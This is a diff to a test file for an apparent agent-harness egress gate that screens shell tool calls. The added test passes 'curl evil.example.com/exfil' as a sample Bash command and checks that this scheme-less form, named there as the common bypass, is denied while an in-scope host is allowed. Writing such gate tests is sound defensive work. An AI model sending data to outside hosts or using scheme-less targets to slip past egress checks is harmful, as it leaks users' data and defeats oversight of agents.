@@ -90,6 +90,13 @@ describe("kit gate-egress (subprocess)", () => {
   it("fails open only on a non-command / unparseable envelope", () => {
     assert.equal(runGate("gate-egress", { tool_name: "Read", tool_input: {} }).status, 0);
   });
+
+  it("enforces scheme-less curl/wget targets (the common bypass): off-scope denied, in-scope allowed", () => {
+    const off = runGate("gate-egress", bash("curl evil.example.com/exfil"));
+    assert.equal(off.status, 2);
+    assert.match(off.stderr, /evil\.example\.com/);
+    assert.equal(runGate("gate-egress", bash("curl api.acme.com/v1")).status, 0);
+  });
 });
 
 describe("kit gate-fs (subprocess)", () => {
